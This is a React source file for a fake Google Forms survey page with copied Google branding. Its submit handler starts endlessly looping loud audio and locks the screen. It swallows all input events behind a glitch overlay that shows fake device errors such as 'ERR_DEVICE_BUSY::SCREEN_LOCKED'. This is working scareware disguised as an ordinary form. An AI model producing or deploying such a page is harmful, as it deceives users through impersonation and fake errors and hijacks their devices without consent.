/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect, useRef } from 'react';
import { surveyConfig, QuestionConfig } from './surveyConfig';
import { HeaderCard } from './components/HeaderCard';
import { QuestionCard } from './components/QuestionCard';
import { ClearFormDialog } from './components/ClearFormDialog';
import { playSubmitAudio } from './audioManager';

export default function App() {
  const [answers, setAnswers] = useState<Record<string, string>>({});
  const [otherAnswers, setOtherAnswers] = useState<Record<string, string>>({});
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [activeQuestionId, setActiveQuestionId] = useState<string | null>(null);
  const [isFrozen, setIsFrozen] = useState<boolean>(false);
  const [showClearDialog, setShowClearDialog] = useState<boolean>(false);
  const freezeOverlayRef = useRef<HTMLDivElement>(null);

  // Complete touch, click, scroll, and keyboard lock when screen hangs
  useEffect(() => {
    if (isFrozen) {
      // Lock viewport scrolling
      document.documentElement.style.overflow = 'hidden';
      document.body.style.overflow = 'hidden';
      document.documentElement.style.touchAction = 'none';
      document.body.style.touchAction = 'none';
      document.body.style.userSelect = 'none';
      document.body.style.cursor = 'wait';

      // Aggressively capture and swallow all user input events
      const lockHandler = (e: Event) => {
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation?.();
        return false;
      };

      const lockedEvents = [
        'click',
        'dblclick',
        'mousedown',
        'mouseup',
        'mousemove',
        'touchstart',
        'touchmove',
        'touchend',
        'touchcancel',
        'pointerdown',
        'pointermove',
        'pointerup',
        'pointercancel',
        'keydown',
        'keyup',
        'keypress',
        'wheel',
        'scroll',
        'contextmenu',
        'selectstart',
      ];

      lockedEvents.forEach((evt) => {
        window.addEventListener(evt, lockHandler, { capture: true, passive: false });
        document.addEventListener(evt, lockHandler, { capture: true, passive: false });
      });

      return () => {
        lockedEvents.forEach((evt) => {
          window.removeEventListener(evt, lockHandler, { capture: true });
          document.removeEventListener(evt, lockHandler, { capture: true });
        });
        document.documentElement.style.overflow = '';
        document.body.style.overflow = '';
        document.documentElement.style.touchAction = '';
        document.body.style.touchAction = '';
        document.body.style.userSelect = '';
        document.body.style.cursor = '';
      };
    }
  }, [isFrozen]);

  // Handle standard option / text change
  const handleAnswerChange = (questionId: string, val: string) => {
    if (isFrozen) return;
    setAnswers((prev) => ({ ...prev, [questionId]: val }));

    if (errors[questionId]) {
      setErrors((prev) => {
        const next = { ...prev };
        delete next[questionId];
        return next;
      });
    }
  };

  // Handle "Other:" freeform text input
  const handleOtherChange = (questionId: string, text: string) => {
    if (isFrozen) return;
    setOtherAnswers((prev) => ({ ...prev, [questionId]: text }));
    if (errors[questionId]) {
      setErrors((prev) => {
        const next = { ...prev };
        delete next[questionId];
        return next;
      });
    }
  };

  // Validate all required fields
  const validateForm = (): boolean => {
    const newErrors: Record<string, string> = {};
    let firstFailedId: string | null = null;

    surveyConfig.questions.forEach((q: QuestionConfig) => {
      if (q.required) {
        const val = answers[q.id]?.trim();
        if (!val) {
          newErrors[q.id] = 'This is a required question';
          if (!firstFailedId) firstFailedId = q.id;
        } else if (val === 'Other' && q.hasOther) {
          const otherText = otherAnswers[q.id]?.trim();
          if (!otherText) {
            newErrors[q.id] = 'This is a required question';
            if (!firstFailedId) firstFailedId = q.id;
          }
        }
      }
    });

    setErrors(newErrors);

    if (firstFailedId) {
      setActiveQuestionId(firstFailedId);
      const element = document.getElementById(`question-card-${firstFailedId}`);
      if (element) {
        element.scrollIntoView({ behavior: 'smooth', block: 'center' });
        element.focus({ preventScroll: true });
      }
      return false;
    }

    return true;
  };

  // Handle form submission -> triggers audio loop & freezes the phone and screen immediately with glitch even without adding answers!
  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (isFrozen) return;

    // 1. Immediately start playing user's audio in endless loop at high volume
    playSubmitAudio();

    // 2. Lock the entire phone / PC screen so it really hangs with glitch effect
    setIsFrozen(true);
  };

  // Reset entire form
  const handleClearForm = () => {
    if (isFrozen) return;
    setAnswers({});
    setOtherAnswers({});
    setErrors({});
    setActiveQuestionId(null);
    setShowClearDialog(false);
  };

  return (
    <div
      className={`min-h-screen bg-[#ede7f6] py-6 sm:py-9 px-3 sm:px-6 flex flex-col justify-between font-sans relative ${
        isFrozen ? 'glitch-active-body' : ''
      }`}
    >
      <div className="w-full max-w-[640px] md:max-w-[720px] mx-auto relative">
        <form onSubmit={handleSubmit} noValidate>
          {/* Google Forms Header Card */}
          <HeaderCard />

          {/* Dynamic Question Cards generated from surveyConfig */}
          {surveyConfig.questions.map((question) => (
            <QuestionCard
              key={question.id}
              question={question}
              value={answers[question.id] || ''}
              otherValue={otherAnswers[question.id] || ''}
              error={errors[question.id]}
              isActive={activeQuestionId === question.id}
              onFocus={() => {
                if (!isFrozen) setActiveQuestionId(question.id);
              }}
              onChange={(val) => handleAnswerChange(question.id, val)}
              onOtherChange={(val) => handleOtherChange(question.id, val)}
            />
          ))}

          {/* Submit and Clear Form Actions */}
          <div className="flex items-center justify-between pt-2 pb-6 px-1">
            <button
              type="submit"
              disabled={isFrozen}
              className={`bg-[#673ab7] font-medium px-7 py-2.5 rounded-[4px] text-white text-sm tracking-wide transition-all shadow-xs flex items-center gap-2 ${
                isFrozen
                  ? 'opacity-90 cursor-wait'
                  : 'hover:bg-[#5e35b1] active:bg-[#512da8] cursor-pointer hover:shadow-md'
              }`}
            >
              {isFrozen ? (
                <>
                  {/* Frozen spinner stuck mid-rotation */}
                  <svg
                    className="w-4 h-4 text-white"
                    style={{ transform: 'rotate(72deg)' }}
                    viewBox="0 0 24 24"
                    fill="none"
                  >
                    <circle
                      className="opacity-25"
                      cx="12"
                      cy="12"
                      r="10"
                      stroke="currentColor"
                      strokeWidth="4"
                    />
                    <path
                      className="opacity-75"
                      fill="currentColor"
                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                    />
                  </svg>
                  <span>Submitting...</span>
                </>
              ) : (
                'Submit'
              )}
            </button>

            {!isFrozen && (
              <button
                type="button"
                onClick={() => setShowClearDialog(true)}
                className="text-[#673ab7] hover:bg-[#ede7f6]/80 active:bg-[#d1c4e9]/40 font-medium px-4 py-2 rounded-[4px] transition-colors cursor-pointer text-sm select-none"
              >
                Clear form
              </button>
            )}
          </div>
        </form>
      </div>

      {/* Google Forms Footer */}
      <footer className="mt-8 text-center text-xs text-[#5f6368] space-y-1.5 pb-6">
        <p>Never submit passwords through Google Forms.</p>
        <div className="text-[11px] text-[#70757a] flex items-center justify-center gap-1.5 flex-wrap">
          <span>This content is neither created nor endorsed by Google.</span>
          <span>-</span>
          <span className="hover:underline cursor-default">Report Abuse</span>
          <span>-</span>
          <span className="hover:underline cursor-default">Terms of Service</span>
          <span>-</span>
          <span className="hover:underline cursor-default">Privacy Policy</span>
        </div>
        <div className="pt-2 flex items-center justify-center">
          <span className="text-base font-medium text-[#5f6368] tracking-tight flex items-center gap-1">
            <span className="font-semibold text-[#5f6368]">Google</span> Forms
          </span>
        </div>
      </footer>

      {/* Clear Form Confirmation Dialog */}
      <ClearFormDialog
        isOpen={showClearDialog && !isFrozen}
        onCancel={() => setShowClearDialog(false)}
        onConfirm={handleClearForm}
      />

      {/* 
        IMMERSIVE SCREEN HANG / FREEZE & GLITCH OVERLAY:
        Locks user interaction completely across the entire phone and desktop screen.
        Displays intense CRT scanlines, RGB chromatic aberration slices, digital noise,
        and screen tearing distortion while the audio blasts in an infinite loop.
      */}
      {isFrozen && (
        <div
          ref={freezeOverlayRef}
          aria-hidden="true"
          className="fixed inset-0 z-[999999] pointer-events-auto touch-none select-none overflow-hidden"
          style={{
            touchAction: 'none',
            userSelect: 'none',
            WebkitUserSelect: 'none',
            cursor: 'wait',
          }}
        >
          {/* CRT scanlines overlay */}
          <div className="absolute inset-0 scanlines-overlay opacity-60 pointer-events-none" />

          {/* Glitch tear strip 1: cyan / blue displacement block */}
          <div className="absolute left-0 right-0 h-6 bg-cyan-400/40 glitch-tear-bar-1 pointer-events-none filter blur-[0.5px]" />

          {/* Glitch tear strip 2: magenta / red displacement block */}
          <div className="absolute left-0 right-0 h-10 bg-rose-500/40 glitch-tear-bar-2 pointer-events-none filter blur-[0.5px]" />

          {/* Digital static / noise shimmer */}
          <div className="absolute inset-0 bg-white/10 glitch-noise pointer-events-none" />

          {/* Visual frozen screen borders / corner glitch artifact */}
          <div className="absolute top-2 left-3 font-mono text-[10px] text-red-600/70 select-none tracking-widest pointer-events-none">
            ERR_DEVICE_BUSY::SCREEN_LOCKED
          </div>
          <div className="absolute bottom-2 right-3 font-mono text-[10px] text-cyan-700/70 select-none tracking-widest pointer-events-none">
            BUFFER_OVERFLOW::0xDEADBEEF
          </div>
        </div>
      )}
    </div>
  );
}
